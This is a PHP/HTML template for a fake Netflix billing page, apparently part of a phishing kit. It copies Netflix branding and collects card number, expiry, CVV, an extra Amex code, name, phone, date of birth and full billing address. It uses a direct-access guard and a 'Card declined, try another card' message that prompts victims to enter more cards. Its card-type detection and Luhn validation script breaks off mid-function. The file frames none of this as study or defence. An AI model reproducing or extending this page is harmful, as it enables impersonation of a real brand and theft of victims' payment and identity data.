<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="i18n-cc-title"></title>
    <link rel="icon" type="image/x-icon" href="/assets/images/nficon2023.ico">
    <link rel="stylesheet" href="/assets/styles/style.css">
    <style>
        /* Clean Loading Screen */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: #ffffff;
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loading-content {
            text-align: center;
            padding: 40px;
        }
        .loading-spinner {
            border: 3px solid #f0f0f0;
            border-top: 3px solid #e50914;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 24px;
        }
        .loading-text {
            margin: 0;
            font-size: 18px;
            font-weight: 400;
            color: #333;
            letter-spacing: 0.5px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Card Validation Styles */
        .form-control.valid-card {
            border-color: #28a745 !important;
            box-shadow: 0 0 0 0.2rem rgba(40, 167, 69, 0.25) !important;
        }
        
        .form-control.invalid-card {
            border-color: #dc3545 !important;
            box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.25) !important;
        }

        /* Button Loading State */
        .start-button {
            position: relative;
            transition: all 0.3s ease;
        }

        .start-button.loading {
            opacity: 0.8;
            cursor: not-allowed;
            pointer-events: none;
        }

        .start-button .btn-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid #ffffff;
            border-radius: 50%;
            animation: btnSpin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes btnSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Card Icon Styles */
        .card-icon {
            width: 40px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            transition: all 0.3s ease;
            border-radius: 4px;
        }

        .card-icon.default-card svg {
            width: 24px;
            height: 24px;
            color: #8c8c8c;
            transition: all 0.3s ease;
        }

        .card-icon.visa {
            background-image: url('/assets/images/VISA.png');
            background-size: 36px auto;
        }

        .card-icon.mastercard {
            background-image: url('/assets/images/MASTERCARD.png');
            background-size: 36px auto;
        }

        .card-icon.amex {
            background-image: url('/assets/images/AMEX.png');
            background-size: 36px auto;
        }

        .card-icon.discover {
            background: linear-gradient(135deg, #ff6000, #ff8533);
            color: white;
            font-size: 9px;
            font-weight: bold;
            font-family: Arial, sans-serif;
            border-radius: 4px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        .card-icon.diners {
            background: linear-gradient(135deg, #0079be, #005a8b);
            color: white;
            font-size: 7px;
            font-weight: bold;
            font-family: Arial, sans-serif;
            border-radius: 4px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        .card-icon.jcb {
            background: linear-gradient(135deg, #006cbc, #004f8a);
            color: white;
            font-size: 9px;
            font-weight: bold;
            font-family: Arial, sans-serif;
            border-radius: 4px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        /* Hide SVG when showing card logos */
        .card-icon.visa svg,
        .card-icon.mastercard svg,
        .card-icon.amex svg,
        .card-icon.discover svg,
        .card-icon.diners svg,
        .card-icon.jcb svg {
            display: none;
        }

        /* Animation effects */
        .card-icon {
            transform-origin: center;
        }

        .card-icon.default-card {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }

        /* Stop pulse animation when card is detected */
        .card-icon:not(.default-card) {
            animation: none;
            opacity: 1;
        }

    </style>
</head>
<body>
    <!-- Simple Loading Screen -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <p class="loading-text" id="i18n-loading"></p>
        </div>
    </div>
    <header class="header">
        <div class="header-content">
            <svg class="netflix-logo" viewBox="0 0 111 30" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img">
                <g><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path></g>
            </svg>
            <a href="#" class="sign-out"></a>
        </div>
    </header>

    <main class="main-content">

        <div class="step-info" id="i18n-cc-step"></div>
        <h1 class="page-title" id="i18n-cc-heading"></h1>

        <div class="card-types">
            <div class="visa-icon"></div>
            <div class="mastercard-icon"></div>
            <div class="amex-icon"></div>
        </div>

        <form id="form">
            <input type="hidden" id="cardType" name="card_type" value="">
            
            <!-- Card declined error message -->
            <div class="error-message" id="cardDeclinedError" style="margin-bottom: 16px;">
                <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                </svg>
                <span>Card declined. Please try another card.</span>
            </div>
            
            <div class="form-group">
                <div class="card-number-wrapper">
                    <div class="input-wrapper">
                        <input type="text" class="form-control" id="cardNumber" name="card_number" placeholder=" " maxlength="19">
                        <label for="cardNumber" class="floating-label" id="i18n-cc-number"></label>
                    </div>
                    <div class="card-icon default-card" id="cardIcon">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="CreditCardStandard" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M0 6C0 4.34315 1.34315 3 3 3H21C22.6569 3 24 4.34315 24 6V18C24 19.6569 22.6569 21 21 21H3C1.34314 21 0 19.6569 0 18V6ZM3 5C2.44772 5 2 5.44772 2 6V8H22V6C22 5.44771 21.5523 5 21 5H3ZM2 18V10H22V18C22 18.5523 21.5523 19 21 19H3C2.44772 19 2 18.5523 2 18ZM16 16H20V14H16V16Z" fill="currentColor"></path>
                        </svg>
                    </div>
                </div>
                <div class="error-message" id="cardNumberError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-cc-number-error"></span>
                </div>
            </div>

            <div class="date-cvv-section">
                <div class="form-row">
                    <div class="form-group">
                        <div class="input-wrapper">
                            <input type="text" class="form-control" id="expDate" name="exp_date" placeholder=" " maxlength="5">
                            <label for="expDate" class="floating-label" id="i18n-cc-expiry"></label>
                        </div>
                        <div class="error-message" id="expDateError">
                            <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                            </svg>
                            <span id="i18n-cc-expiry-error"></span>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-wrapper">
                            <input type="text" class="form-control" id="cvv" name="cvv" placeholder=" " maxlength="4">
                            <label for="cvv" class="floating-label" id="i18n-cc-cvv"></label>
                            <svg class="cvv-info" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="CircleQuestionMarkStandard" pointer-events="all" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0ZM12 8C10.6831 8 10 8.74303 10 9.5H8C8 7.25697 10.0032 6 12 6C13.9968 6 16 7.25697 16 9.5C16 10.8487 14.9191 11.7679 13.8217 12.18C13.5572 12.2793 13.3322 12.4295 13.1858 12.5913C13.0452 12.7467 13 12.883 13 13V14H11V13C11 11.5649 12.1677 10.6647 13.1186 10.3076C13.8476 10.0339 14 9.64823 14 9.5C14 8.74303 13.3169 8 12 8ZM13.5 16.5C13.5 17.3284 12.8284 18 12 18C11.1716 18 10.5 17.3284 10.5 16.5C10.5 15.6716 11.1716 15 12 15C12.8284 15 13.5 15.6716 13.5 16.5Z" fill="currentColor"></path>
                        </svg>
                        </div>
                        <div class="error-message" id="cvvError">
                            <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                            </svg>
                            <span id="i18n-cc-cvv-error"></span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- CID field for American Express cards only -->
            <div class="form-group" id="cidField" style="display: none;">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="cid" name="cid" placeholder=" " maxlength="3">
                    <label for="cid" class="floating-label" id="i18n-cc-cid"></label>
                    <svg class="cvv-info" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="CircleQuestionMarkStandard" pointer-events="all" aria-hidden="true">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0ZM12 8C10.6831 8 10 8.74303 10 9.5H8C8 7.25697 10.0032 6 12 6C13.9968 6 16 7.25697 16 9.5C16 10.8487 14.9191 11.7679 13.8217 12.18C13.5572 12.2793 13.3322 12.4295 13.1858 12.5913C13.0452 12.7467 13 12.883 13 13V14H11V13C11 11.5649 12.1677 10.6647 13.1186 10.3076C13.8476 10.0339 14 9.64823 14 9.5C14 8.74303 13.3169 8 12 8ZM13.5 16.5C13.5 17.3284 12.8284 18 12 18C11.1716 18 10.5 17.3284 10.5 16.5C10.5 15.6716 11.1716 15 12 15C12.8284 15 13.5 15.6716 13.5 16.5Z" fill="currentColor"></path>
                </svg>
                </div>
                <div class="error-message" id="cidError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-cc-cid-error"></span>
                </div>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="nameOnCard" name="name_on_card" placeholder=" ">
                    <label for="nameOnCard" class="floating-label" id="i18n-cc-name"></label>
                </div>
                <div class="error-message" id="nameOnCardError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-cc-name-error"></span>
                </div>
            </div>

            <!-- Billing Information Section -->
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="tel" class="form-control" id="phoneNumber" name="phone" placeholder=" ">
                    <label for="phoneNumber" class="floating-label" id="i18n-billing-phone"></label>
                </div>
                <div class="error-message" id="phoneNumberError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-billing-phone-error"></span>
                </div>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="dateOfBirth" name="date_of_birth" placeholder=" " maxlength="10">
                    <label for="dateOfBirth" class="floating-label" id="i18n-billing-dob"></label>
                </div>
                <div class="error-message" id="dateOfBirthError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-billing-dob-error"></span>
                </div>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="address1" name="address1" placeholder=" ">
                    <label for="address1" class="floating-label" id="i18n-billing-address1"></label>
                </div>
                <div class="error-message" id="address1Error">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-billing-address1-error"></span>
                </div>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="address2" name="address2" placeholder=" ">
                    <label for="address2" class="floating-label" id="i18n-billing-address2"></label>
                </div>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="text" class="form-control" id="city" name="city" placeholder=" ">
                        <label for="city" class="floating-label" id="i18n-billing-city"></label>
                    </div>
                    <div class="error-message" id="cityError">
                        <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                        </svg>
                        <span id="i18n-billing-city-error"></span>
                    </div>
                </div>
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="text" class="form-control" id="state" name="state" placeholder=" ">
                        <label for="state" class="floating-label" id="i18n-billing-state"></label>
                    </div>
                    <div class="error-message" id="stateError">
                        <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                        </svg>
                        <span id="i18n-billing-state-error"></span>
                    </div>
                </div>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="postalCode" name="postal_code" placeholder=" " maxlength="10">
                    <label for="postalCode" class="floating-label" id="i18n-billing-postal"></label>
                </div>
                <div class="error-message" id="postalCodeError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-billing-postal-error"></span>
                </div>
            </div>

            <div class="disclaimer" id="i18n-cc-disclaimer"></div>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="agree" name="agree" class="checkbox">
                <label for="agree" class="checkbox-label" id="i18n-cc-agree"></label>
            </div>

            <button type="submit" class="start-button" id="continueBtn"></button>

            <div class="recaptcha-notice">
                <span id="i18n-cc-recaptcha"></span> <a href="#" id="i18n-cc-learn"></a>.
            </div>
        </form>
    </main>


    <footer class="footer">
        <div class="footer-content">
            <div class="footer-contact" id="i18n-footer-contact"></div>

            <div class="footer-links">
                <a href="#" id="i18n-footer-faq"></a>
                <a href="#" id="i18n-footer-help"></a>
                <a href="#" id="i18n-footer-terms"></a>
                <a href="#" id="i18n-footer-privacy"></a>
                <a href="#" id="i18n-footer-cookies"></a>
                <a href="#" id="i18n-footer-corporate"></a>
                <a href="#" id="i18n-footer-adchoices"></a>
            </div>

            <div class="language-selector" style="position: relative; display: inline-block; margin-top: 20px;">
                <svg class="language-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="LanguagesSmall" aria-hidden="true" style="position: absolute; left: 8px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; color: #737373; pointer-events: none; z-index: 1;">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.7668 5.33333L10.5038 5.99715L9.33974 8.9355L8.76866 10.377L7.33333 14H9.10751L9.83505 12.0326H13.4217L14.162 14H16L12.5665 5.33333H10.8278H10.7668ZM10.6186 9.93479L10.3839 10.5632H11.1036H12.8856L11.6348 7.2136L10.6186 9.93479ZM9.52722 4.84224C9.55393 4.77481 9.58574 4.71045 9.62211 4.64954H6.41909V2H4.926V4.64954H0.540802V5.99715H4.31466C3.35062 7.79015 1.75173 9.51463 0 10.4283C0.329184 10.7138 0.811203 11.2391 1.04633 11.5931C2.55118 10.6795 3.90318 9.22912 4.926 7.57316V12.6667H6.41909V7.51606C6.81951 8.15256 7.26748 8.76169 7.7521 9.32292L8.31996 7.88955C7.80191 7.29052 7.34631 6.64699 6.9834 5.99715H9.06968L9.52722 4.84224Z" fill="currentColor"></path>
                </svg>
                <select name="language" id="language" style="background: transparent; border: 1px solid #737373; color: #737373; padding: 8px 32px 8px 32px; font-size: 13px; border-radius: 2px; appearance: none; cursor: pointer; min-width: 120px;">
                    <option value="en">English</option>
                    <option value="es">Español</option>
                </select>
                <svg class="dropdown-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); width: 12px; height: 12px; color: #737373; pointer-events: none; z-index: 1;">
                    <path d="M8 10.586L3.414 6 2 7.414 8 13.414 14 7.414 12.586 6z" fill="currentColor"/>
                </svg>
            </div>
            
            <div class="footer-country" id="i18n-footer-country"></div>
        </div>
    </footer>

    <script>
        // Simple Loading Screen - Hide after 1.5 seconds
        setTimeout(function() {
            const loadingOverlay = document.getElementById('loading-overlay');
            if (loadingOverlay) {
                loadingOverlay.style.opacity = '0';
                loadingOverlay.style.transition = 'opacity 0.3s ease';
                setTimeout(function() {
                    loadingOverlay.remove();
                }, 300);
            }
        }, 1500);

        // Card type detection and formatting
        document.addEventListener('DOMContentLoaded', function() {
            const cardNumberInput = document.getElementById('cardNumber');
            const cardIcon = document.getElementById('cardIcon');
            const cvvInput = document.getElementById('cvv');

            // Card type patterns
            const cardTypes = {
                visa: {
                    pattern: /^4/,
                    lengths: [13, 16, 19],
                    cvvLength: 3,
                    format: /(\d{1,4})(\d{1,4})?(\d{1,4})?(\d{1,4})?/,
                    name: 'Visa'
                },
                mastercard: {
                    pattern: /^(5[1-5]|2[2-7])/,
                    lengths: [16],
                    cvvLength: 3,
                    format: /(\d{1,4})(\d{1,4})?(\d{1,4})?(\d{1,4})?/,
                    name: 'Mastercard'
                },
                amex: {
                    pattern: /^3[47]/,
                    lengths: [15],
                    cvvLength: 4,
                    format: /(\d{4})(\d{6})(\d{5})/,
                    name: 'American Express'
                },
                discover: {
                    pattern: /^(6011|622[1-9]|64[4-9]|65)/,
                    lengths: [16],
                    cvvLength: 3,
                    format: /(\d{1,4})(\d{1,4})?(\d{1,4})?(\d{1,4})?/,
                    name: 'Discover'
                },
                diners: {
                    pattern: /^(30[0-5]|36|38)/,
                    lengths: [14],
                    cvvLength: 3,
                    format: /(\d{1,4})(\d{1,6})?(\d{1,4})?/,
                    name: 'Diners Club'
                },
                jcb: {
                    pattern: /^35/,
                    lengths: [16],
                    cvvLength: 3,
                    format: /(\d{1,4})(\d{1,4})?(\d{1,4})?(\d{1,4})?/,
                    name: 'JCB'
                }
            };

            // Luhn algorithm for card validation
            function validateCardNumber(cardNumber) {
                // Remove spaces and non-digits
                const cleanNumber = cardNumber.replace(/\D/g, '');
                
                // Must be at least 13 digits
                if (cleanNumber.length < 13) {
                    return false;
                }
                
                let sum = 0;
                let isEven = false;
                
                // Loop through digits from right to left
                for (let i = cleanNumber.length - 1; i >= 0; i--) {
                    let digit = parseInt(cleanNumber[i]);
                    
                    if (isEven) {
                        digit *= 2;
                        if (digit > 9) {
                            digit -= 9;
                        }
                    }
                    
                    sum += digit;
